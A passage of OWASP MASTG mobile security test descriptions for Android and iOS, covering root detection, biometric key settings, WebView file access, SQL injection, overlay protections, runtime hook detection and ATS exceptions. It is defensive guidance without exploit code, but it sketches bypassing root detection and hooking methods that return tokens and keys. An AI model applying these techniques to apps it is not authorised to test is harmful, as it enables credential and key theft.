See @MASTG-KNOW-0027 for more information on root detection techniques and specific APIs and artifacts to look for.

This test is best combined with @MASTG-TEST-0325, which performs dynamic testing to confirm whether the identified root detection mechanisms are active at runtime. This way, you can use static analysis to surface potential root detection logic and then focus your dynamic testing on those specific checks to confirm they are triggered at runtime. Alternatively, you can perform dynamic testing first to identify any root detection mechanisms that are active at runtime, and then use static analysis to further investigate their implementation and coverage.

!!! note "Out of Scope"
    This test does not cover robustness or effectiveness of root detection mechanisms, which can be very difficult to assess through static analysis alone and may require manual reverse engineering and custom instrumentation. See @MASTG-BEST-0030 for best practices on implementing root detection effectively and understanding its limitations.

## Steps

1. Use @MASTG-TECH-0014 with appropriate patterns to search for root detection APIs and methods in the decompiled code.

## Observation

The output should contain a list of locations where root detection checks are implemented, including specific methods and file paths being checked.

## Evaluation

The test case fails if the app does not implement any root detection checks. However, note that static analysis may not detect all root detection mechanisms, especially if they are proprietary, obfuscated, or implemented in native code.

If root detection checks are found, this is a positive sign, but you should still evaluate their effectiveness. See @MASTG-BEST-0030.
## Runtime Use of Root Detection Techniques

## Overview

This test verifies whether an app implements runtime root detection by attempting to hook into common root detection mechanisms. These may include checks for files and artifacts typically associated with rooted devices, as well as calls to known root detection APIs or libraries.

See @MASTG-KNOW-0027 for more information on root detection techniques and specific APIs and artifacts to look for.

This test is best combined with @MASTG-TEST-0324, which checks for the presence of root detection logic through static analysis. This way, you can obtain a list of potential root detection mechanisms from static analysis and then focus your dynamic testing on those specific checks to confirm they are triggered at runtime. Or you can perform dynamic testing first to identify any root detection mechanisms that are active at runtime, and then use static analysis to further investigate their implementation and coverage.

It is recommended to run this test using a rooted device or emulator to ensure that root detection mechanisms are triggered during testing. However, even on a non-rooted device, this test can still surface root detection logic if the app performs checks that do not require root access (for example, checking for the presence of root-related files or system properties).

!!! note "Out of Scope"
    This test does not cover robustness or effectiveness of root detection mechanisms, which can be very difficult to assess through automated testing alone and may require manual reverse engineering and custom instrumentation. See @MASTG-BEST-0030 for best practices on implementing root detection effectively.

## Steps

1. Run @MASTG-TECH-0043, @MASTG-TECH-0033 or @MASTG-TECH-0032 to trace the relevant API calls.
2. Optionally, run @MASTG-TECH-0144 to try to bypass root detection checks in the application and observe the results. For example, successful bypassing of certain checks or failed detections may indicate the presence of root detection mechanisms.

## Observation

The output should contain any instances of root detection checks, along with the methods or APIs that were hooked.

## Evaluation

The test case fails if no instances of root detection checks are observed. However, results from this test should be interpreted as evidence of the presence of root detection logic, not as an assessment of its robustness or effectiveness. See @MASTG-BEST-0030.

**Expected False Negatives:**

This test relies on tracing and bypass tools to surface root detection logic. Detection mechanisms that are highly obfuscated, implemented entirely in native code, dynamically loaded at runtime, or protected by anti instrumentation techniques may not be observed. In such cases, the absence of findings does not guarantee the absence of root detection, and additional manual reverse engineering or custom instrumentation may be required.
## References to APIs Allowing Fallback to Non-Biometric Authentication

## Overview

This test checks if the app uses biometric authentication mechanisms (@MASTG-KNOW-0001) that allow fallback to device credentials (PIN, pattern, or password) for sensitive operations.

On Android, the [`android.hardware.biometrics.BiometricPrompt`](https://developer.android.com/reference/android/hardware/biometrics/BiometricPrompt) API (or its Jetpack counterpart [`androidx.biometric.BiometricPrompt`](https://developer.android.com/reference/androidx/biometric/BiometricPrompt) that backward compatibility to API level 23) can be configured to accept different types of [`BiometricManager.Authenticators`](https://developer.android.com/reference/android/hardware/biometrics/BiometricManager.Authenticators#constants_1) via the [`setAllowedAuthenticators`](https://developer.android.com/reference/android/hardware/biometrics/BiometricPrompt.Builder#setAllowedAuthenticators(int)) method.

When the authenticator constant `DEVICE_CREDENTIAL` is included (either alone or combined with biometric authenticators using the `OR` operator "`|`"), the authentication allows fallback to device credentials, which is considered weaker than requiring biometrics alone because passcodes are more susceptible to compromise (e.g., through [shoulder surfing](https://en.wikipedia.org/wiki/Shoulder_surfing_%28computer_security%29)).

Similarly, using [`setDeviceCredentialAllowed(true)`](https://developer.android.com/reference/android/hardware/biometrics/BiometricPrompt.Builder#setDeviceCredentialAllowed(boolean)) (deprecated since API 30) also enables fallback to device credentials.

## Steps

1. Run a static analysis (@MASTG-TECH-0014) tool to identify instances of the relevant APIs.

## Observation

The output should include a list of locations where the relevant APIs are used.

## Evaluation

The test case fails if the app uses `BiometricPrompt` with authenticators that include `DEVICE_CREDENTIAL` for any sensitive data resource that needs protection.

!!! note
    Using `DEVICE_CREDENTIAL` is not inherently a vulnerability, but in high-security applications (e.g., finance, government, health), their use can represent a weakness or misconfiguration that reduces the intended security posture. This issue is therefore better categorized as a security weakness or hardening issue, not a critical vulnerability.
## References to APIs for Event-Bound Biometric Authentication

## Overview

This test checks if the app implements event-bound biometric authentication (@MASTG-KNOW-0001) to access sensitive resources (e.g., tokens, keys), where authentication success relies solely on a callback result rather than being cryptographically bound to sensitive operations and requiring user presence.

On Android, `BiometricPrompt.authenticate()` can be called [with a `CryptoObject`](https://developer.android.com/reference/android/hardware/biometrics/BiometricPrompt#authenticate(android.hardware.biometrics.BiometricPrompt.CryptoObject,%20android.os.CancellationSignal,%20java.util.concurrent.Executor,%20android.hardware.biometrics.BiometricPrompt.AuthenticationCallback)) or [without a `CryptoObject`](https://developer.android.com/reference/android/hardware/biometrics/BiometricPrompt#authenticate(android.os.CancellationSignal,%20java.util.concurrent.Executor,%20android.hardware.biometrics.BiometricPrompt.AuthenticationCallback)). When used **without a `CryptoObject`** the app relies on the [`onAuthenticationSucceeded`](https://developer.android.com/reference/android/hardware/biometrics/BiometricPrompt.AuthenticationCallback#onAuthenticationSucceeded(android.hardware.biometrics.BiometricPrompt.AuthenticationResult)) callback to determine if authentication was successful (event-bound). This makes it susceptible to logic manipulation by overwriting the callback without successfully passing the biometric verification.

In contrast, when a `CryptoObject` is used (crypto-bound), the app passes a cryptographic object (e.g., `Cipher`, `Signature`, `Mac`) that requires user authentication. This ensures authentication is not just a one-time boolean, but part of a secure data retrieval path (out-of-process), so bypassing authentication becomes significantly harder.

## Steps

1. Run a static analysis (@MASTG-TECH-0014) tool to identify instances of the relevant APIs.

## Observation

The output should include a list of locations where the relevant APIs are used.

## Evaluation

The test case fails for each sensitive operation worth protecting if all of the following applies:

- `BiometricPrompt.authenticate` is used [without a `CryptoObject`](https://developer.android.com/reference/android/hardware/biometrics/BiometricPrompt#authenticate(android.os.CancellationSignal,%20java.util.concurrent.Executor,%20android.hardware.biometrics.BiometricPrompt.AuthenticationCallback)).
- There are no calls to key generation with `setUserAuthenticationRequired(true)` in conjunction with biometric authentication, as by default, the key is authorized to be used regardless of whether the user has been authenticated or not.
## References to APIs Detecting Biometric Enrollment Changes

## Overview

This test checks whether the app fails to protect sensitive operations against unauthorized access following biometric enrollment changes (@MASTG-KNOW-0001). An attacker who obtains the device passcode could add a new fingerprint or facial representation via system settings and use it to authenticate in the app.

This behaviour occurs when [`setInvalidatedByBiometricEnrollment`](https://developer.android.com/reference/android/security/keystore/KeyGenParameterSpec.Builder#setInvalidatedByBiometricEnrollment(boolean)) is set to `false` when keys are generated.

By default and when set to `true`, a key becomes permanently invalidated if a new biometric is enrolled. As a result, only users whose biometric data was enrolled when the item was created can unlock it. This prevents unauthorized access through biometrics enrolled later.

## Steps

1. Run a static analysis (@MASTG-TECH-0014) tool to identify instances of the relevant APIs.

## Observation

The output should include a list of locations where the relevant APIs are used.

## Evaluation

The test case fails if the app uses `setInvalidatedByBiometricEnrollment(false)` for keys used to protect sensitive data resources.
## References to APIs Enforcing Authentication without Explicit User Action

## Overview

This test checks if the app enforces biometric authentication (@MASTG-KNOW-0001) [without requiring explicit user action](https://developer.android.com/identity/sign-in/biometric-auth#no-explicit-user-action). When using [`android.hardware.biometrics.BiometricPrompt`](https://developer.android.com/reference/android/hardware/biometrics/BiometricPrompt) API (or its Jetpack counterpart [`androidx.biometric.BiometricPrompt`](https://developer.android.com/reference/androidx/biometric/BiometricPrompt) that backward compatibility to API level 23), the [`setConfirmationRequired()`](https://developer.android.com/reference/android/hardware/biometrics/BiometricPrompt.Builder#setConfirmationRequired(boolean)) method in [`BiometricPrompt.Builder`](https://developer.android.com/reference/android/hardware/biometrics/BiometricPrompt.Builder) controls whether the user must explicitly confirm their authentication, which is enforced by default.

## Steps

1. Run a static analysis (@MASTG-TECH-0014) tool to identify instances of the relevant APIs.

## Observation

The output should include a list of locations where the relevant APIs are used.

## Evaluation

The test case fails if the app sets `setConfirmationRequired()` to `false` for sensitive operations that require explicit user authorization.

!!! note
    Using [`setConfirmationRequired(false)`](https://developer.android.com/identity/sign-in/biometric-auth#no-explicit-user-action) is not inherently a vulnerability. It may be appropriate for low-risk operations, but for sensitive operations like payments or data access, the app should use `setConfirmationRequired(true)` or rely on the default behavior to [ensure the user explicitly confirms the authentication](https://developer.android.com/identity/sign-in/biometric-auth#no-explicit-user-action).
## References to APIs for Keys used in Biometric Authentication with Extended

## Overview

This test checks if the app configures cryptographic keys with an extended validity duration that allows keys to remain unlocked beyond the immediate operation. When using biometric authentication with [`CryptoObject`](https://developer.android.com/reference/androidx/biometric/BiometricPrompt.CryptoObject), the authentication validity duration determines how long a key remains usable after successful authentication.

On Android, developers can configure this behavior using [`setUserAuthenticationParameters(int timeout, int type)`](https://developer.android.com/reference/android/security/keystore/KeyGenParameterSpec.Builder#setUserAuthenticationParameters(int,%20int)) or the deprecated [`setUserAuthenticationValidityDurationSeconds(int)`](https://developer.android.com/reference/android/security/keystore/KeyGenParameterSpec.Builder#setUserAuthenticationValidityDurationSeconds(int)) when generating keys with [`KeyGenParameterSpec.Builder`](https://developer.android.com/reference/android/security/keystore/KeyGenParameterSpec.Builder):

- **Duration = 0**: The key requires authentication for every cryptographic operation. This is the most secure configuration as each use of the key requires biometric verification.
- **Duration > 0**: The key remains unlocked for the specified duration (in seconds) after successful authentication. When the duration is set to a high value in the range of minutes or hours an attacker with physical access to the phone could trigger sensitive operations without biometric verification.

## Steps

1. Run a static analysis (@MASTG-TECH-0014) tool to identify instances of the relevant APIs.

## Observation

The output should include a list of locations where the relevant APIs are used.

## Evaluation

The test case fails if the app configures keys used for sensitive operations with:

- `setUserAuthenticationParameters(duration, type)` where duration > 0
- `setUserAuthenticationValidityDurationSeconds(duration)` where duration > 0

!!! note
    A non-zero authentication validity duration is not inherently a vulnerability. Short durations in the range of seconds may be acceptable for certain use cases where multiple related operations need to be performed in quick succession. However, for high-security applications and sensitive operations, requiring authentication per use (duration = 0) provides the strongest protection against unauthorized key usage and runtime attacks.
## Use of Deprecated WebView APIs

## Overview

In this test, we look for references to `UIWebView` (@MASTG-KNOW-0076), a deprecated component since iOS 12.0, in favor of `WKWebView`. `UIWebView` presents security and performance risks: it does not allow JavaScript to be fully disabled, lacks process isolation (which `WKWebView` provides), and doesn't support modern web security features like Content Security Policy (CSP).

## Steps

1. Extract the app as described in @MASTG-TECH-0058.
2. Look for references to `UIWebView` in the app using @MASTG-TECH-0070 on all executables and libraries.

## Observation

The output should contain a list of locations where `UIWebView`s are used.

## Evaluation

The test case fails if any use of `UIWebView` is found in the app.
## Attacker-Controlled URI in WebViews

## Overview

iOS apps can dynamically load content into a [`WKWebView`](https://developer.apple.com/documentation/webkit/wkwebview) using various URL load methods. These methods can render both remote web content and locally stored files.

The following WKWebView APIs are commonly targeted if they process untrusted input:

**Remote URL Loading:**

- [`load(_:)`](https://developer.apple.com/documentation/webkit/wkwebview/load(_:))

**Local URL and Content Loading:**

- [`loadFileRequest(_:allowingReadAccessTo:)`](https://developer.apple.com/documentation/webkit/wkwebview/loadfilerequest(_:allowingreadaccessto:))
- [`loadFileURL(_:allowingReadAccessTo:)`](https://developer.apple.com/documentation/webkit/wkwebview/loadfileurl(_:allowingreadaccessto:))
- [`loadHTMLString(_:baseURL:)`](https://developer.apple.com/documentation/webkit/wkwebview/loadhtmlstring(_:baseurl:))
- [`load(_:mimeType:characterEncodingName:baseURL:)`](https://developer.apple.com/documentation/webkit/wkwebview/load(_:mimetype:characterencodingname:baseurl:))

Regardless of the source, passing a URL originating from attacker-controlled input (for example through a deep link, custom URL scheme, or user-supplied data from the UI) directly to the `WKWebView` URL load methods can lead to vulnerabilities such as unauthorized redirection, Cross-Site Scripting (XSS), or local file disclosure.

This test checks whether the app passes attacker-controlled input to `WKWebView` URL load APIs without adequate URL validation.

## Steps

1. Extract the app as described in @MASTG-TECH-0058.
2. Run a static analysis tool such as @MASTG-TOOL-0073 on the app binary, looking for calls to any `WKWebView` URL load APIs.

## Observation

The output should contain a list of locations in the binary where `WKWebView` URL load APIs are called.

## Evaluation

The test case fails if any call to `WKWebView` URL load APIs is found where the URL is derived from attacker-controlled input without proper validation.

Inspect each reported code location using @MASTG-TECH-0076.

- Trace where the URL originates.
- Determine whether it is derived from attacker-controlled input, for example a custom URL scheme parameter, a deep link component, or unsanitized user input from the UI.
- Verify that the URL is adequately validated before being passed to `WKWebView` URL load APIs.
## Overly Broad File Read Access in WebViews

## Overview

iOS apps can load local files into a [`WKWebView`](https://developer.apple.com/documentation/webkit/wkwebview) using [`loadFileURL(_:allowingReadAccessTo:)`](https://developer.apple.com/documentation/webkit/wkwebview/loadfileurl(_:allowingreadaccessto:)).

This test checks whether the app uses `loadFileURL(_:allowingReadAccessTo:)` with an overly broad `readAccessURL`. If attacker-controlled input influences the loaded file URL and the read access scope is too broad, the WebView may gain access to sensitive files within the app container.

## Steps

1. Extract the app as described in @MASTG-TECH-0058.
2. Run a static analysis tool such as @MASTG-TOOL-0073 on the app binary, looking for calls to `WKWebView.loadFileURL(_:allowingReadAccessTo:)`.

## Observation

The output should contain a list of locations in the binary where `WKWebView.loadFileURL(_:allowingReadAccessTo:)` is called.

## Evaluation

The test case fails if any call to `loadFileURL(_:allowingReadAccessTo:)` is found where the `readAccessURL` argument grants overly broad read access, for example to the entire `Documents` directory or the app container root.

Inspect each reported call site using @MASTG-TECH-0076.

- Inspect the `fileURL` argument and determine whether it can be influenced by attacker-controlled input.
- Inspect the `readAccessURL` argument and determine whether it grants broader access than necessary.
- Verify that the allowed read scope is restricted to the minimum directory required for the intended content.
## Native Code Exposed Through WebViews

## Overview

This test verifies Android apps that use WebViews with [legacy WebView-Native bridges](https://developer.android.com/develop/ui/views/layout/webapps/native-api-access-jsbridge#addjavascriptinterface) do not expose native code to websites loaded inside the WebView.

These bridges are created by registering a Java object with the WebView through [`addJavascriptInterface`](https://developer.android.com/reference/kotlin/android/webkit/WebView#addjavascriptinterface). Public methods of that object that are annotated with [`@JavascriptInterface`](https://developer.android.com/reference/android/webkit/JavascriptInterface) become callable from JavaScript running inside the WebView, using the provided `name` as the global JavaScript object.

For this mechanism to work, JavaScript execution must be enabled on the WebView by calling [`WebSettings.setJavaScriptEnabled(true)`](https://developer.android.com/reference/android/webkit/WebSettings#setJavaScriptEnabled(boolean)) (default is `false`), since the exposed interface is invoked from JavaScript code executed within the page.

## Steps

1. Use @MASTG-TECH-0013 to reverse engineer the app.
2. Use @MASTG-TECH-0014 to look for references to the relevant WebView APIs.

## Observation

The output should contain any references to the relevant WebView APIs.

## Evaluation

The test case fails if all the following are true:

- `setJavaScriptEnabled` is explicitly set to `true`.
- `addJavascriptInterface` is used at least once.
- At least one method annotated with `@JavascriptInterface` handles sensitive data or actions and is reachable from untrusted content. See below.

**Context Considerations**:

To reduce false positives, make sure you understand the context in which the bridge is being used before reporting the associated code as insecure. Ensure that it is being used in a security-relevant context to protect sensitive data or actions, and that it is reachable from untrusted content. For example, if the WebView can load arbitrary or weakly validated URLs, or if the app does not implement proper origin allowlisting for the bridge.

**Well-known Challenges when testing for WebView-Native bridges**:

- The app may use parametrized or indirect calls to these APIs, for example through utility methods or wrapper classes. Static analysis may not be able to resolve these calls, and dynamic analysis may require specific app states or user interactions to trigger them.
- The app may use several WebViews with different configurations, and it may be difficult to determine which values are set for each WebView instance, especially if they are created dynamically, in different code paths or even across different files.
- The app may use obfuscation, reflection, or dynamic code loading to hide the use of these APIs.
## WebView File Origin Access Relaxed by Configuration

## Overview

`WKWebView` supports configuration that affects how JavaScript running from `file://` origins can access other resources. In particular, `allowFileAccessFromFileURLs` allows JavaScript running in the context of a `file://` URL to access content from other `file://` URLs, while `allowUniversalAccessFromFileURLs` allows JavaScript running in the context of a `file://` URL to access content from any origin. Both settings are considered dangerous when enabled because they relax the origin restrictions that normally apply to local content which increases the risk of vulnerabilities such as Cross-Site Scripting (XSS) or Local File Inclusion (LFI) leading to data exfiltration or other malicious actions.

This test checks whether the app enables either of these settings for any `WKWebView` instance. On iOS, these settings are commonly accessed through non-public or unsupported paths, for example by using key value coding on `WKPreferences` or `WKWebViewConfiguration` via `setValue:forKey:` or equivalent Swift calls.

Remember that JavaScript is enabled by default unless the app explicitly sets [`WKWebViewPreferences.setJavaScriptEnabled`](https://developer.apple.com/documentation/webkit/wkpreferences/javascriptenabled) (deprecated since iOS 14) or [`WKWebpagePreferences.allowsContentJavaScript`](https://developer.apple.com/documentation/webkit/wkwebpagepreferences/allowscontentjavascript) to `false`.

This test is related to, but distinct from, @MASTG-TEST-0333, which focuses on the **native file system read scope** granted to the WebView through `loadFileURL(_:allowingReadAccessTo:)`. By contrast, this test focuses on **JavaScript origin restrictions** for content loaded from `file://` URLs. Even if the file read scope is correctly restricted, enabling `allowFileAccessFromFileURLs` or `allowUniversalAccessFromFileURLs` can allow JavaScript (e.g. `fetch()`, `XMLHttpRequest`) running in a local page to access additional resources or communicate with remote origins.

## Steps

1. Extract the app as described in @MASTG-TECH-0058.
2. Run a static analysis tool such as @MASTG-TOOL-0073 on the app binary and search for references to the relevant configuration values.

## Observation

The output should identify locations in the binary where the app references or enables the relevant configuration values.

## Evaluation

The test case fails if the app enables `allowFileAccessFromFileURLs` or `allowUniversalAccessFromFileURLs` for a `WKWebView` that loads local `file://` content.

Inspect each reported call site using @MASTG-TECH-0076.

- Determine whether `allowFileAccessFromFileURLs` or `allowUniversalAccessFromFileURLs` is explicitly used and set to `true`, for example through `setValue:forKey:` or equivalent Swift calls.
- Determine which `WKWebView` instance receives the configuration and whether it handles sensitive information or functionality.
- Determine whether that `WKWebView` loads local `file://` content, for example using APIs such as `loadFileURL(_:allowingReadAccessTo:)` or `loadHTMLString(_:baseURL:)` with a `file://` base URL.

Note that some apps may use variables or configuration logic to set `allowFileAccessFromFileURLs` or `allowUniversalAccessFromFileURLs`, which can make them difficult to identify through static analysis alone. Dynamic analysis can help confirm whether the settings are enabled at runtime.

For the identified WebViews, determine whether attacker-controlled JavaScript could execute in the local page context, for example through HTML injection, JavaScript injection, or other untrusted content. Also determine whether the attacker could exfiltrate accessed data, for example by sending it to a remote server using `fetch` or `XMLHttpRequest`, or by embedding it in requests to external resources such as images or iframes.
## Runtime Setting of Relaxed WebView File Origin Policies

## Overview

This test is the dynamic counterpart to @MASTG-TEST-0335.

`WKWebView` supports configuration that affects how JavaScript running from `file://` origins can access other resources. In particular, `allowFileAccessFromFileURLs` allows JavaScript running in the context of a `file://` URL to access content from other `file://` URLs, while `allowUniversalAccessFromFileURLs` allows JavaScript running in the context of a `file://` URL to access content from any origin. Both settings are dangerous when enabled because they relax the origin restrictions that normally apply to local content.

This test verifies at runtime whether the application enables either of these settings for a `WKWebView` that loads local `file://` content.

## Steps

1. Deploy the app to a device or simulator as described in @MASTG-TECH-0056.
2. Launch the app with a runtime instrumentation tool such as @MASTG-TOOL-0039.
3. Hook the relevant WebKit APIs to observe whether the app enables relaxed file origin policies and loads local content into a `WKWebView`.
4. Trigger the code paths that create and configure the `WKWebView`.
5. Inspect the captured runtime arguments.

Typical APIs to monitor include:

- `WKPreferences _setAllowFileAccessFromFileURLs:`
- `WKWebViewConfiguration _setAllowUniversalAccessFromFileURLs:`
- `WKPreferences setJavaScriptEnabled:`
- `WKWebView loadFileURL:allowingReadAccessToURL:`
- `WKWebView loadHTMLString:baseURL:` when a `file://` base URL may be used

## Observation

The output should show whether the application enables `allowFileAccessFromFileURLs` or `allowUniversalAccessFromFileURLs` at runtime and whether the affected `WKWebView` loads local `file://` content.

## Evaluation

The test case fails if the application enables `allowFileAccessFromFileURLs` or `allowUniversalAccessFromFileURLs` for a `WKWebView` that loads local `file://` content.

Inspect each reported call site using @MASTG-TECH-0077.

- Determine whether `allowFileAccessFromFileURLs` or `allowUniversalAccessFromFileURLs` is explicitly used and set to `true`.
- Determine which `WKWebView` instance receives the configuration and whether it handles sensitive information or functionality.
- Determine whether that `WKWebView` loads local `file://` content, for example using APIs such as `loadFileURL(_:allowingReadAccessTo:)` or `loadHTMLString(_:baseURL:)` with a `file://` base URL.

Note that some apps may use variables or configuration logic to set these values, which can make them difficult to identify through static analysis alone. Dynamic analysis can help confirm whether the settings are enabled at runtime.

For the identified WebViews, determine whether attacker-controlled JavaScript could execute in the local page context, for example through HTML injection, JavaScript injection, or other untrusted content. Also determine whether the attacker could exfiltrate accessed data, for example by sending it to a remote server using `fetch` or `XMLHttpRequest`, or by embedding it in requests to external resources such as images or iframes.

Even if exploitability cannot be fully confirmed, it is recommended to remove these settings because they weaken the origin isolation normally applied to `file://` content. Enabling them increases the impact of other WebView vulnerabilities, such as content injection or improper handling of untrusted input.
## References to Object Deserialization of Untrusted Data

## Overview

Android apps can reconstruct objects from serialized data received through platform mechanisms such as `Intent` extras, `Bundle` values, IPC payloads, files, or network responses. If the app deserializes data from these sources without restricting the allowed classes or validating the input before use, the deserialization logic can introduce unintended application behavior or unsafe state changes.

This test checks whether the app uses object deserialization on Android and whether the deserialized data originates from potentially untrusted sources without appropriate filtering or validation. For background on Android serialization and deserialization mechanisms, see @MASTG-KNOW-0021.

## Steps

1. Reverse engineer the app (@MASTG-TECH-0013).
2. Run static analysis (@MASTG-TECH-0014) to search for references to object deserialization APIs.

## Observation

The output should contain a list of locations where object deserialization is used.

## Evaluation

The test case fails if the app deserializes data received from untrusted sources (e.g., Intent extras from any other application) without proper validation or type filtering.
## Integrity and Authenticity Validation of Local Storage Data

## Overview

Apps may store sensitive data in local storage and later use it in security-relevant decisions. If that data can be modified by an attacker and the app does not verify its integrity and authenticity before using it, the app may trust tampered input.

This test applies to local storage broadly, including `SharedPreferences`, files, databases, and other app managed storage locations.

For example, when using `SharedPreferences` specifically, the data is stored in the app's private sandbox and normally cannot be modified by other apps. However, it can still be tampered with in local attack scenarios, such as on rooted devices, during dynamic analysis, through backups, or by directly manipulating the app's data directory after obtaining privileged access, as described in @MASTG-KNOW-0036. Because of that, apps should not blindly trust security-relevant data loaded from local storage.

When performing this test, look not only for storage read APIs, but also for nearby integrity and authenticity validation logic. Depending on the implementation, this may include APIs and patterns related to HMACs, MAC comparison, cryptographic initialization, signature verification, checksums, or other mechanisms intended to detect tampering.

## Steps

1. Reverse engineer the app with @MASTG-TECH-0017.
2. Run a static analysis tool with @MASTG-TECH-0014 on the reverse engineered app to identify APIs that read data from local storage and, where possible, related integrity and authenticity validation APIs.

## Observation

The output should contain code locations where the app reads data from local storage. Depending on the storage API and the analysis rule, these code locations may include APIs such as `SharedPreferences.getString`, file reads, database queries, or nearby comparison and verification logic such as HMAC or MAC related operations.

## Evaluation

The test case fails if the app doesn't verify the integrity and authenticity of data loaded from local storage before being used in security-relevant decisions.

This means that the presence of the target APIs, for example `SharedPreferences.getString`, does not inherently fail the test. Each reported code location must be carefully analyzed by reverse engineering it and checking whether the app performs the proper validation.

When evaluating reported code locations, determine:

1. What value is being loaded from local storage.
2. Whether that value can influence a security-relevant decision, such as authentication state, authorization, feature access, configuration, or trust decisions.
3. Whether the app verifies the integrity and authenticity of the loaded value before using it, for example with an HMAC, MAC, signature, or similar verification mechanism.
4. Whether that validation is effective for the attacker model in scope.
## SQL Injection in Content Providers

## Overview

Android applications can share structured data via `ContentProvider` components. However, if these providers create SQL queries using untrusted input from URIs without adequate validation or parameterization, they risk becoming susceptible to SQL injection attacks.

## Steps

1. Reverse engineer the app (@MASTG-TECH-0013).
2. Run static analysis (@MASTG-TECH-0014) to search for unsafe SQL construction in ContentProviders.

## Observation

The output should contain a list of locations where user-controlled input from URIs or selection arguments is concatenated into SQL queries, for example via `Uri.getPathSegments()` and `SQLiteQueryBuilder.appendWhere()`.

## Evaluation

The test case fails if:

- Untrusted user input (e.g., from `getPathSegments()`) is directly concatenated into SQL statements.
- The app uses `appendWhere()` or builds queries unsafely without sanitization or parameterization.
## References to Overlay Attack Protections

## Overview

Overlay attacks (also known as tapjacking) allow malicious apps to place deceptive UI elements over a legitimate app's interface, potentially tricking users into performing unintended actions such as granting permissions, revealing credentials, or authorizing payments. If the app does not implement appropriate protections, users can interact with overlaid malicious content while believing they are interacting with the legitimate app.

Android provides several mechanisms to protect against overlay attacks through touch filtering. These mechanisms can detect when a view is obscured and filter touch events accordingly. However, if the app does not use these protections on sensitive UI elements, it remains vulnerable to overlay attacks.

This test checks whether the app implements overlay attack protections by looking for references to touch filtering APIs and attributes that prevent interaction when views are obscured.

These include:

- The `setFilterTouchesWhenObscured` method.
- The `android:filterTouchesWhenObscured` attribute in layout files.
- The `onFilterTouchEventForSecurity` method.
- Checks for `FLAG_WINDOW_IS_OBSCURED` or `FLAG_WINDOW_IS_PARTIALLY_OBSCURED` flags.
- The [`setHideOverlayWindows`](https://developer.android.com/reference/android/view/Window#setHideOverlayWindows(boolean)) method and the required `HIDE_OVERLAY_WINDOWS` permission for API level 31 and above.

## Steps

1. Use @MASTG-TECH-0014 to search for references to overlay protection mechanisms.
2. Use @MASTG-TECH-0117 to obtain the AndroidManifest.xml file and check the `targetSdkVersion` and any relevant permissions.

## Observation

The output should contain:

- A list of locations where overlay protection mechanisms are used
- The app's `targetSdkVersion`
- Any relevant permissions, such as `HIDE_OVERLAY_WINDOWS`

## Evaluation

The test fails if the app handles sensitive user interactions (such as login, payment confirmation, permission requests, or security settings) and does not implement any overlay attack protections on those sensitive UI elements.

For example:

- The app doesn't implement `setFilterTouchesWhenObscured(true)` or `android:filterTouchesWhenObscured="true"` on sensitive UI elements.
- The app doesn't override `onFilterTouchEventForSecurity` to implement custom security policies.
- The app doesn't check for `FLAG_WINDOW_IS_OBSCURED` or `FLAG_WINDOW_IS_PARTIALLY_OBSCURED` in touch event handlers for sensitive interactions.
- The app targets API level 31 or higher but does not use `setHideOverlayWindows(true)` and declare the `HIDE_OVERLAY_WINDOWS` permission.
## Testing Runtime Hook Detection

## Overview

This test verifies whether the app detects and responds to instrumentation and hooking attempts at runtime. For example, if the app does not terminate immediately when the following methods are called:

- Authentication tokens, OAuth tokens, session credentials, and stored account passwords could be extracted if [`AccountManager.getPassword()`](https://developer.android.com/reference/kotlin/android/accounts/AccountManager#getpassword), [`AccountManager.getAuthToken()`](https://developer.android.com/reference/kotlin/android/accounts/AccountManager#getauthtoken) are hooked.
- Cryptographic keys and certificates could be extracted if [`KeyStore.getKey()`](https://developer.android.com/reference/kotlin/java/security/KeyStore#getkey), [`KeyStore.getCertificate()`](https://developer.android.com/reference/kotlin/java/security/KeyStore#getcertificate) are hooked.
- Ephemeral/Session Keys could be extracted if [`Cipher.doFinal()`](https://developer.android.com/reference/kotlin/javax/crypto/Cipher#dofinal) is hooked.
- Database contents could be extracted if [`SQLiteDatabase.rawQuery()`](https://developer.android.com/reference/kotlin/android/database/sqlite/SQLiteDatabase#rawquery), [`SQLiteDatabase.query()`](https://developer.android.com/reference/kotlin/android/database/sqlite/SQLiteDatabase#query), [`SQLiteDatabase.execSQL()`](https://developer.android.com/reference/kotlin/android/database/sqlite/SQLiteDatabase#execsql) are hooked.
- Encrypted data could be extracted if [`EncryptedSharedPreferences`](https://developer.android.com/reference/kotlin/androidx/security/crypto/EncryptedSharedPreferences) APIs are hooked.
- Authentication could be bypassed if [`KeyGenParameterSpec.Builder.setUserAuthenticationRequired()`](https://developer.android.com/reference/kotlin/android/security/keystore/KeyGenParameterSpec.Builder#setuserauthenticationrequired) is hooked.
- Any other function that processes or returns sensitive data is hooked.

!!! warning
    This list is just indicative, and each app may have its own defensive response mechanisms.

## Steps

1. Use @MASTG-TECH-0005 to install the app.
2. Use @MASTG-TECH-0033 to attempt to hook a security-relevant Java method (e.g., authentication, certificate validation) and/or a native function.
3. Capture the output, including any abrupt session termination events or errors.

## Observation

The output should contain one of the following:

- The expected hook callback data (e.g., function arguments, return values).
- Session termination, script errors, empty responses, or absence of expected hook data.

## Evaluation

The test case fails if the hook executes successfully and returns the expected data, indicating the app lacks runtime integrity verification.

The test case passes if the hooking attempt fails due to the app's defensive response (e.g., session terminates unexpectedly, hook callbacks never execute, or the process exits).

!!! note
    Even if the test case passes, it might still be possible to bypass the app's defensive response. @MASTG-KNOW-0030 and @MASTG-KNOW-0032 describe such challenges.
## References to Weak ATS TLS Policy Exceptions in Info.plist

## Overview

Apps can weaken ATS TLS enforcement through `NSAppTransportSecurity` exceptions in `Info.plist`. In particular:

- [`NSExceptionMinimumTLSVersion`](https://developer.apple.com/documentation/bundleresources/information-property-list/nsexceptionminimumtlsversion) allows connections to servers with TLS versions below 1.2, including the deprecated TLS 1.0 and TLS 1.1.
- [`NSExceptionRequiresForwardSecrecy`](https://developer.apple.com/documentation/bundleresources/information-property-list/nsexceptionrequiresforwardsecrecy) set to `false` disables the ATS requirement for [Perfect Forward Secrecy (PFS)](https://developer.apple.com/documentation/security/preventing-insecure-network-connections), weakening the confidentiality of the connection even when TLS itself is otherwise required.

These exceptions are applied per domain under `NSExceptionDomains`. When broadly scoped (especially with `NSIncludesSubdomains = true`), they may affect many hosts and increase the attack surface for [Machine-in-the-Middle (MITM)](../../../Document/0x04f-Testing-Network-Communication.md#intercepting-network-traffic-through-mitm) attacks. Apple requires a justification for these exceptions when submitting to the App Store. See @MASTG-KNOW-0071 for more details on ATS configuration and exceptions.

